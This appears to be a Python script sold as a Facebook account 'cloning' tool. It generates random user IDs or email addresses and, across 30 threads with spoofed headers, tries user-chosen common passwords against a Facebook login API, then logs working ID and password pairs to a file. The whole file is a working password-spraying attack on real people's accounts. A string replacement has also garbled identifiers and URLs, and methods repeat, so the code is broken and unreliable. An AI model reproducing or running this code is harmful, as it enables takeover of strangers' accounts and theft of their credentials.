W = '\033[97;1m' 
R = '\033[91;1m' 
G = '\033[92;1m' 
Y = '\033[93;1m' 
B = '\033[94;1m'
P = '\033[95;1m'
C = '\033[96;1m'
N = '\x1b[0m'



import os
try:
	import requests
except ImportError:
	os.system("pip install requests")

try:
	import concurrent.futures
except ImportError:
	os.system("pip install futures")

import os
import sys
import time
import requests
import random
import platform
import base64
import subprocess
from concurrent.futures import ThreadPoolExecutor


def runtxt(z):
    for e in z + "\n":
        sys.stdout.write(e)
        sys.stdout.flush()
        time.sleep(0.03)

def folder():
    try:
        os.mkdir('dump')
    except:pass

def helpnote():
	print("%s [*] FOLLOW ME ON Fb TU KNOW ABOUT UPDATES  :)"%(G))
	subprocess.check_output(["am", "start", "https://github.com/FOYSAL-404/test/blob/main/a.txt"])
	exit(" [*] FACEBOOK :  https://m.me/FOYSAL.OFFICIALS.ACCOUNT0075")


def notice():

 

	runtxt("\n\033[0;91mYOU ARE NOT PREMIUM USER ")
	runtxt("\033[0;93m  SENT THIS KEY TO ADMIN >> %s%s"%(G,basesplit))
	runtxt("\033[0;92m ADMIN MESSENGER🔰FOYSAL HOSEN")
	subprocess.check_output(["am", "start", "https://m.me/FOYSAL.OFFICIALS.ACCOUNT0075"])

def irfan():
	
	
	runtxt("\n\033[0;91m This tool is Under maintenance break ")
	runtxt("\n\033[0;91m So wait For Update ")
        
	
	
plist = (platform.uname())[2]
basex = plist
basex1 = basex.encode('ascii')
basex2 = base64.b64encode(basex1)
basex3 = basex2.decode('ascii')
base4 = (basex3).upper()
basesplit = base4.replace('=', 'X').replace('A', '3').replace('B', '9').replace('C', '7').replace('D', '1').replace('E', '4').replace('M', '2').replace('L', '6').replace('F', '8').replace('N', 'E').replace('T', '8')


class Main:
	def __init__(self):
		self.id = []
		self.T.K.S-Ok = []
		self.T.K.S-Ok = []
		self.loop = 0
		os.system("clear")
		
		print ("""\033[1;92m 
  _______ _  __   _____ 
 |__   __| |/ /  / ____|
    | |  | ' /  | (___  
    | |  |  <    \___ \ 
    | |_ | . \ _ ____) |
    |_(_)|_|\_(_)_____/ 
                                           
\033[1;90m══════════════════════════════════════════════════
\033[1;91m [\033[1;94m✓\033[1;91m] \033[1;92mFACEBOK : FOYSAL HOSEN 
\033[1;91m [\033[1;94m✓\033[1;91m] \033[1;92mFB GROUP : Top King Star 07
\033[1;91m [\033[1;94m✓\033[1;91m] \033[1;92mGITHUB   : - FOYSAL-404
\033[1;91m [\033[1;94m✓\033[1;91m] \033[1;92mWARNING  : Fuck My All Haters
\033[1;90m══════════════════════════════════════════════════
    """)
		print("%s [%s•%s] %sTOOL NAME : %sSuper Speed Uid Cloning"%(G,R,G,B,G))
		print("%s [%s•%s] %sVERSION   : %s2.0"%(G,R,G,B,G))
		print("")
		print("%s [%s01%s]%s CRACK RANDOM FB ID 2009-11 %s(PRO) V1[High Speed]"%(R,G,R,Y,G))
		print("%s [%s02%s]%s CRACK FROM EMAILS %s(PRO) [Normal]"%(R,G,R,Y,G))
		hoga = input("\n%s [?] CHOICE : "%(B))
		if hoga in ["", " "]:
			Main()
		elif hoga in ["", "0"]:
				self.oldcrack()
		elif hoga in ["1", "01"]:
			    self.fbtuek()
		elif hoga in ["2", "02"]:
				self.email()
		elif hoga in ["P", "p"]:
			Main()

	def oldcrack(self):
		x = 11111111
		xx = 99999999
		idx = " 1000000"
		idx = random.choice(["1", "2", "3", "4", "5", "6", "7", "8", "9"])
		limit = int(input("\033[0;92m [+] ENTER LIMIT \033[0;91m(50000 MAX): \033[0;92m"))
		if (limit)>50000:
			exit("\n%s [!] DON'T CROSS THE LIMIT BRO :)"%(R))
		try:
			for n in range(limit):
				_ = random.randint(x,xx)
				__ = idx
				self.id.append(__+str(_))
			print("\033[0;93m [+] TOTAL ID -> \033[0;91m%s\033[0;97m"%(len(self.id))) 
			with ThreadPoolExecutor(max_workers=30) as coeg:
				print("\n%s [!] USE %s, %s(COMMA)%s FOR SEPARATOR "%(Y,G,B,Y))
				print("%s EXAMPLE : %s123456,1234567,123456789"%(Y,G))
				listpass = input("%s [?] ENTER PASSWORD :%s "%(Y,G))
				if len(listpass)<=5:
					exit("\n%s [!] PASSWORD MINIMUM 6 CHARACTERS"%(R))
				print("%s [*] CRACK WITH PASSWORD -> [\033[0;91m%s\033[0;93m]"%(Y,listpass))
				print("\n%s [+] T.K.S-Ok RESULTS SAVED IN -> T.K.S-Ok.txt"%(G))
				print("%s [+] T.K.S-Ok RESULTS SAVED IN -> T.K.S-Ok.txt"%(Y))
				print("%s [!] IF NO RESULT TURN ON AIRPLANE MODE 5 SECONDS\x1b[0m\n"%(R))
				for user in self.id:
					coeg.submit(self.api, user, listpass.split(","))
			exit("\n\n%s [#] CRACK COMPLETE..."%(G))
		except Exception as e:exit(str(e))

	def oldcrack(self):
		x = 11111111
		xx = 99999999
		idx = " 1000000"
		idx = random.choice(["1", "2", "3", "4", "5", "6", "7", "8", "9"])
		limit = int(input("\033[0;92m [+] ENTER LIMIT \033[0;91m(50000 MAX): \033[0;92m"))
		if (limit)>50000:
			exit("\n%s [!] DON'T CROSS THE LIMIT BRO :)"%(R))
		try:
			for n in range(limit):
				_ = random.randint(x,xx)
				__ = idx
				self.id.append(__+str(_))
			print("\033[0;93m [+] TOTAL ID -> \033[0;91m%s\033[0;97m"%(len(self.id))) 
			with ThreadPoolExecutor(max_workers=30) as coeg:
				print("\n%s [!] USE %s, %s(COMMA)%s FOR SEPARATOR "%(Y,G,B,Y))
				print("%s EXAMPLE : %s123456,1234567,123456789"%(Y,G))
				listpass = input("%s [?] ENTER PASSWORD :%s "%(Y,G))
				if len(listpass)<=5:
					exit("\n%s [!] PASSWORD MINIMUM 6 CHARACTERS"%(R))
				print("%s [*] CRACK WITH PASSWORD -> [\033[0;91m%s\033[0;93m]"%(Y,listpass))
				print("\n%s [+] T.K.S-Ok RESULTS SAVED IN -> T.K.S-Ok.txt"%(G))
				print("%s [+] T.K.S-Ok RESULTS SAVED IN -> T.K.S-Ok.txt"%(Y))
				print("%s [!] IF NO RESULT TURN ON AIRPLANE MODE 5 SECONDS\x1b[0m\n"%(R))
				for user in self.id:
					coeg.submit(self.api, user, listpass.split(","))
			exit("\n\n%s [#] CRACK COMPLETE..."%(G))
		except Exception as e:exit(str(e))

	def fbtuek(self):
		x = 11111111
		xx = 99999999
		idx = "1000000"
		limit = int(input("\033[0;92m [+] ENTER LIMIT \033[0;91m(50000 MAX): \033[0;92m"))
		if (limit)>50000:
			exit("\n%s [!] DON'T CROSS THE LIMIT BRO :)"%(R))
		try:
			for n in range(limit):
				_ = random.randint(x,xx)
				__ = idx
				self.id.append(__+str(_))
			print("\033[0;93m [+] TOTAL ID -> \033[0;91m%s\033[0;97m"%(len(self.id))) 
			gull = input("simpan nama file : ")
			save = ("dump/"+gull+".txt").replace(" ", "_")
			with ThreadPoolExecutor(max_workers=30) as coeg:
				print("\n%s [!] USE %s, %s(COMMA)%s FOR SEPARATOR "%(Y,G,B,Y))
				print("%s EXAMPLE : %s123456,1234567,123456789"%(Y,G))
				listpass = input("%s [?] ENTER PASSWORD :%s "%(Y,G))
				if len(listpass)<=5:
					exit("\n%s [!] PASSWORD MINIMUM 6 CHARACTERS"%(R))
				print("%s [*] CRACK WITH PASSWORD -> [\033[0;91m%s\033[0;93m]"%(Y,listpass))
				print("\n%s [+] T.K.S-Ok RESULTS SAVED IN -> T.K.S-Ok.txt"%(G))
				print("%s [+] T.K.S-Ok RESULTS SAVED IN -> T.K.S-Ok.txt"%(Y))
				print("%s [!] IF NO RESULT TURN ON AIRPLANE MODE 5 SECONDS\x1b[0m\n"%(R))
				for user in self.id:
					coeg.submit(self.api, user, listpass.split(","))
			exit("\n\n%s [#] CRACK COMPLETE..."%(G))
		except Exception as e:exit(str(e))
		
	def fbtua1(self):
		x = 1111111
		xx = 9999999
		idx = "10"
		limit = int(input("\033[0;92m [+] ENTER LIMIT \033[0;91m(50000 MAX): \033[0;92m"))
		if (limit)>50000:
			exit("\n%s [!] DON'T CROSS THE LIMIT BRO :)"%(R))
		try:
			for n in range(limit):
				_ = random.randint(x,xx)
				__ = idx
				self.id.append(__+str(_))
			print("\033[0;93m [+] TOTAL ID -> \033[0;91m%s\033[0;97m"%(len(self.id))) 
			with ThreadPoolExecutor(max_workers=30) as coeg:
				print("\n%s [!] USE %s, %s(COMMA)%s FOR SEPARATOR "%(Y,G,B,Y))
				print("%s EXAMPLE : %s123456,1234567,123456789"%(Y,G))
				listpass = input("%s [?] ENTER PASSWORD :%s "%(Y,G))
				if len(listpass)<=5:
					exit("\n%s [!] PASSWORD MINIMUM 6 CHARACTERS"%(R))
				print("%s [*] CRACK WITH PASSWORD -> [\033[0;91m%s\033[0;93m]"%(Y,listpass))
				print("\n%s [+] T.K.S-Ok RESULTS SAVED IN -> T.K.S-Ok.txt"%(G))
				print("%s [+] T.K.S-Ok RESULTS SAVED IN -> T.K.S-Ok.txt"%(Y))
				print("%s [!] IF NO RESULT TURN ON AIRPLANE MODE 5 SECONDS\x1b[0m\n"%(R))
				for user in self.id:
					coeg.submit(self.api, user, listpass.split(","))
			exit("\n\n%s [#] CRACK COMPLETE..."%(G))
		except Exception as e:exit(str(e))

	def oldcrack(self):
		x = 11111111
		xx = 99999999
		idx = " 1000000"
		idx = random.choice(["1", "2", "3", "4", "5", "6", "7", "8", "9"])
		limit = int(input("\033[0;92m [+] ENTER LIMIT \033[0;91m(50000 MAX): \033[0;92m"))
		if (limit)>50000:
			exit("\n%s [!] DON'T CROSS THE LIMIT BRO :)"%(R))
		try:
			for n in range(limit):
				_ = random.randint(x,xx)
				__ = idx
				self.id.append(__+str(_))
			print("\033[0;93m [+] TOTAL ID -> \033[0;91m%s\033[0;97m"%(len(self.id))) 
			with ThreadPoolExecutor(max_workers=30) as coeg:
				print("\n%s [!] USE %s, %s(COMMA)%s FOR SEPARATOR "%(Y,G,B,Y))
				print("%s EXAMPLE : %s123456,1234567,123456789"%(Y,G))
				listpass = input("%s [?] ENTER PASSWORD :%s "%(Y,G))
				if len(listpass)<=5:
					exit("\n%s [!] PASSWORD MINIMUM 6 CHARACTERS"%(R))
				print("%s [*] CRACK WITH PASSWORD -> [\033[0;91m%s\033[0;93m]"%(Y,listpass))
				print("\n%s [+] T.K.S-Ok RESULTS SAVED IN -> T.K.S-Ok.txt"%(G))
				print("%s [+] T.K.S-Ok RESULTS SAVED IN -> T.K.S-Ok.txt"%(Y))
				print("%s [!] IF NO RESULT TURN ON AIRPLANE MODE 5 SECONDS\x1b[0m\n"%(R))
				for user in self.id:
					coeg.submit(self.api, user, listpass.split(","))
			exit("\n\n%s [#] CRACK COMPLETE..."%(G))
		except Exception as e:exit(str(e))

	def oldcrack(self):
		x = 11111111
		xx = 99999999
		idx = " 1000000"
		idx = random.choice(["1", "2", "3", "4", "5", "6", "7", "8", "9"])
		limit = int(input("\033[0;92m [+] ENTER LIMIT \033[0;91m(50000 MAX): \033[0;92m"))
		if (limit)>50000:
			exit("\n%s [!] DON'T CROSS THE LIMIT BRO :)"%(R))
		try:
			for n in range(limit):
				_ = random.randint(x,xx)
				__ = idx
				self.id.append(__+str(_))
			print("\033[0;93m [+] TOTAL ID -> \033[0;91m%s\033[0;97m"%(len(self.id))) 
			with ThreadPoolExecutor(max_workers=30) as coeg:
				print("\n%s [!] USE %s, %s(COMMA)%s FOR SEPARATOR "%(Y,G,B,Y))
				print("%s EXAMPLE : %s123456,1234567,123456789"%(Y,G))
				listpass = input("%s [?] ENTER PASSWORD :%s "%(Y,G))
				if len(listpass)<=5:
					exit("\n%s [!] PASSWORD MINIMUM 6 CHARACTERS"%(R))
				print("%s [*] CRACK WITH PASSWORD -> [\033[0;91m%s\033[0;93m]"%(Y,listpass))
				print("\n%s [+] T.K.S-Ok RESULTS SAVED IN -> T.K.S-Ok.txt"%(G))
				print("%s [+] T.K.S-Ok RESULTS SAVED IN -> T.K.S-Ok.txt"%(Y))
				print("%s [!] IF NO RESULT TURN ON AIRPLANE MODE 5 SECONDS\x1b[0m\n"%(R))
				for user in self.id:
					coeg.submit(self.api, user, listpass.split(","))
			exit("\n\n%s [#] CRACK COMPLETE..."%(G))
		except Exception as e:exit(str(e))


	def old4_6(self):
		x = 1111111
		xx = 9999999
		#idx = input("%s [+] ENTER A DIGIT (1-9): %s"%(Y,G))
		idx = random.choice(["1", "2", "3", "4", "5", "6", "7", "8", "9"])
		limit = int(input("\033[0;92m [+] ENTER LIMIT \033[0;91m(10000 MAX): \033[0;92m"))
		if (limit)>10000:
			exit("\n%s [!] DON'T CROSS THE LIMIT BRO :)"%(R))
		try:
			for n in range(limit):
				_ = random.randint(x,xx)
				__ = idx
				self.id.append(__+str(_))
			print("\033[0;93m [+] TOTAL ID -> \033[0;91m%s\033[0;97m"%(len(self.id))) 
			with ThreadPoolExecutor(max_workers=30) as coeg:
				print("\n%s [!] USE %s, %s(COMMA)%s FOR SEPARATOR "%(Y,G,B,Y))
				print("%s EXAMPLE : %s123456,1234567,123456789"%(Y,G)) 
				listpass = input("%s [?] ENTER PASSWORD :%s "%(Y,G))
				if len(listpass)<=5:
					exit("\n%s [!] PASSWORD MINIMUM 6 CHARACTERS"%(R))
				print("%s [*] CRACK WITH PASSWORD -> [\033[0;91m%s\033[0;93m]"%(Y,listpass))
				print("\n%s [+] T.K.S-Ok RESULTS SAVED IN -> T.K.S-Ok.txt"%(G))
				print("%s [+] T.K.S-Ok RESULTS SAVED IN -> T.K.S-Ok.txt"%(Y))
				print("%s [!] IF NO RESULT TURN ON AIRPLANE MODE 5 SECONDS\x1b[0m\n"%(R))
				for user in self.id:
					coeg.submit(self.api, user, listpass.split(","))
			exit("\n\n%s [#] CRACK COMPLETE..."%(G))
		except Exception as e:exit(str(e))
		
		
	def old4_5(self):
		x = 111111
		xx = 999999
		idx = input("%s [+] ENTER A DIGIT (1-9): %s"%(Y,G))
		#idx = random.choice(["1", "2", "3", "4", "5", "6", "7", "8", "9"])
		limit = int(input("\033[0;92m [+] ENTER LIMIT \033[0;91m(50000 MAX): \033[0;92m"))
		if (limit)>50000:
			exit("\n%s [!] DON'T CROSS THE LIMIT BRO :)"%(R))
		try:
			for n in range(limit):
				_ = random.randint(x,xx)
				__ = idx
				self.id.append(__+str(_))
			print("\033[0;93m [+] TOTAL ID -> \033[0;91m%s\033[0;97m"%(len(self.id))) 
			with ThreadPoolExecutor(max_workers=30) as coeg:
				print("\n%s [!] USE %s, %s(COMMA)%s FOR SEPARATOR "%(Y,G,B,Y))
				print("%s EXAMPLE : %s123456,1234567,123456789"%(Y,G)) 
				listpass = input("%s [?] ENTER PASSWORD :%s "%(Y,G))
				if len(listpass)<=5:
					exit("\n%s [!] PASSWORD MINIMUM 6 CHARACTERS"%(R))
				print("%s [*] CRACK WITH PASSWORD -> [\033[0;91m%s\033[0;93m]"%(Y,listpass))
				print("\n%s [+] T.K.S-Ok RESULTS SAVED IN -> T.K.S-Ok.txt"%(G))
				print("%s [+] T.K.S-Ok RESULTS SAVED IN -> T.K.S-Ok.txt"%(Y))
				print("%s [!] IF NO RESULT TURN ON AIRPLANE MODE 5 SECONDS\x1b[0m\n"%(R))
				for user in self.id:
					coeg.submit(self.api, user, listpass.split(","))
			exit("\n\n%s [#] CRACK COMPLETE..."%(G))
		except Exception as e:exit(str(e))
		
		
	def old4_5(self):
		x = 111111
		xx = 999999
		idx = input("%s [+] ENTER A DIGIT (1-9): %s"%(Y,G))
		#idx = random.choice(["1", "2", "3", "4", "5", "6", "7", "8", "9"])
		limit = int(input("\033[0;92m [+] ENTER LIMIT \033[0;91m(10000 MAX): \033[0;92m"))
		if (limit)>10000:
			exit("\n%s [!] DON'T CROSS THE LIMIT BRO :)"%(R))
		try:
			for n in range(limit):
				_ = random.randint(x,xx)
				__ = idx
				self.id.append(__+str(_))
			print("\033[0;93m [+] TOTAL ID -> \033[0;91m%s\033[0;97m"%(len(self.id))) 
			with ThreadPoolExecutor(max_workers=30) as coeg:
				print("\n%s [!] USE %s, %s(COMMA)%s FOR SEPARATOR "%(Y,G,B,Y))
				print("%s EXAMPLE : %s123456,1234567,123456789"%(Y,G)) 
				listpass = input("%s [?] ENTER PASSWORD :%s "%(Y,G))
				if len(listpass)<=5:
					exit("\n%s [!] PASSWORD MINIMUM 6 CHARACTERS"%(R))
				print("%s [*] CRACK WITH PASSWORD -> [\033[0;91m%s\033[0;93m]"%(Y,listpass))
				print("\n%s [+] T.K.S-Ok RESULTS SAVED IN -> T.K.S-Ok.txt"%(G))
				print("%s [+] T.K.S-Ok RESULTS SAVED IN -> T.K.S-Ok.txt"%(Y))
				print("%s [!] IF NO RESULT TURN ON AIRPLANE MODE 5 SECONDS\x1b[0m\n"%(R))
				for user in self.id:
					coeg.submit(self.api, user, listpass.split(","))
			exit("\n\n%s [#] CRACK COMPLETE..."%(G))
		except Exception as e:exit(str(e))


	def email(self):
		x = 111
		xx = 999
		nam = input("%s [?] TYPE A NAME %s(EX: Riyad): "%(Y,G))
		nam = nam.replace(" ", "")
		print("%s EXAMPLE  : %s@gmail.com, @yahoo.com, @hotmail.com ETC"%(Y,G))
		idx = input("%s DOMAIN  : "%(B))
		limit = int(input("\033[0;92m [+] ENTER LIMIT \033[0;91m(50000 MAX): \033[0;92m"))
		if (limit)>50000:
			exit("\n%s [!] DON'T CROSS THE LIMIT BRO :)"%(R))
		try:
			for n in range(limit):
				_ = random.randint(x,xx)
				__ = idx
				___ = nam
				self.id.append(___+str(_)+__)
			print("\033[0;93m [+] TOTAL ID -> \033[0;91m%s\033[0;97m"%(len(self.id))) 
			with ThreadPoolExecutor(max_workers=30) as coeg:
				print("\n%s [!] USE %s, %s(COMMA)%s FOR SEPARATOR "%(Y,G,B,Y))
				print("%s EXAMPLE : %s123456,1234567,123456789"%(Y,G)) 
				listpass = input(" [?] ENTER PASSWORD : ")
				if len(listpass)<=5:
					exit("\n%s [!] PASSWORD MINIMUM 6 CHARACTERS"%(R))
				print("%s [*] CRACK WITH PASSWORD -> [\033[0;91m%s\033[0;93m]"%(Y,listpass))
				print("\n%s [+] T.K.S-Ok RESULTS SAVED IN -> T.K.S-Ok.txt"%(G))
				print("%s [+] T.K.S-Ok RESULT SAVED IN -> T.K.S-Ok.txt"%(Y))
				print("%s [!] IF NO RESULT TURN ON AIRPLANE MODE 5 SECONDS\x1b[0m\n"%(R))
				for user in self.id:
					coeg.submit(self.api, user, listpass.split(","))
			exit("\n\n%s [#] CRACK COMPLETE..."%(G))
		except Exception as e:exit(str(e))
		
		

	def api(self, uid, pwx):
		ua = random.choice([
			"Mozilla/5.0 (Linux; Android 11; RMX2195) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Mobile Safari/537.36;]",
			"Mozilla/5.0 (Linux; Android 6.0.1; Redmi 4A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.110 Mobile Safari/537.36",
			"Mozilla/5.0 (Linux; U; Android 7.0; id-id; Redmi Note 4 Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/89.0.4389.116 Mobile Safari/537.36 XiaoMi/MiuiBrowser/12.15.3-go"
			"Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16';]"
		])
		sys.stdout.write(
			"\r\r %s[/] %s/%s -> \033[0;92m [T.K.S-Ok:%s ]- \033[0;91m[T.K.S-Ok:%s ]"%(B,self.loop, len(self.id), len(self.T.K.S-Ok), len(self.T.K.S-Ok))
		); sys.stdout.flush()
		for pw in pwx:
			pw = pw.lower()
			ses = requests.Session()
			headers = {
				"x-fb-connection-bandwidth": str(random.randint(20000000.0, 30000000.0)), 
				"x-fb-sim-hni": str(random.randint(20000, 40000)), 
				"x-fb-net-hni": str(random.randint(20000, 40000)), 
				"x-fb-connection-quality": "EXCELLENT",
				"x-fb-connection-type": "cell.CTRadioAccessTechnologyHSDPA",
				"user-agent": ua, 
				"content-type": "application/x-www-form-urlencoded", 
				"x-fb-http-engine": "Liger"
			}
			response = ses.get("https://b-api.faceboT.K.S-Ok.com/method/auth.login?format=json&email="+str(uid)+"&password="+str(pw)+"&credentials_type=device_based_login_password&generate_session_coT.K.S-Okies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.faceboT.K.S-Ok.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_tT.K.S-Oken=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&T.K.S-Okl=true", headers=headers) 
			if "session_key" in response.text and "EAAA" in response.text:
				print("\r \033[0;92m[T.K.S-Ok] %s|%s\033[0;97m         "%(uid, pw))
				self.T.K.S-Ok.append("%s|%s"%(uid, pw))
				open("T.K.S-Ok.txt","a").write(" [T.K.S-Ok] %s|%s\n"%(uid, pw))
				uploadT.K.S-Oks()
				break
			elif "www.faceboT.K.S-Ok.com" in response.json()["error_msg"]:
				print("\r \033[0;92m[T.K.S-Ok] %s|%s\033[0;97m         "%(uid, pw))
				self.T.K.S-Ok.append("%s|%s"%(uid, pw))
				open("T.K.S-Ok.txt","a").write(" [T.K.S-Ok] %s|%s\n"%(uid, pw))
				uploadT.K.S-Oks()
				break
			else:
				continue

		self.loop +=1

if len(sys.argv) == 2:
	if sys.argv[1] == "--help" or sys.argv[1] == "-h":
		helpnote()
	else:
		Main()

try:Main()
except Exception as e:exit(str(e))
